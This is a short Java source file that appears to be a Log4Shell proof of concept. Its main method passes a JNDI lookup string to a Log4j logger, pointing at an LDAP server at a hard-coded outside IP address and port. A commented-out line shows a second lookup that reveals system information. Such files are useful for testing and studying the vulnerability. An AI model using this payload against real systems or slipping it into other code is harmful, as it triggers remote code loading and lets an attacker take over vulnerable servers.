package run.ergou.jndi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4jJNDI {
    public static final Logger logger = LogManager.getLogger(Log4jJNDI.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://101.37.84.167:22222/any}");
//        logger.error("${java:os}");
    }
}
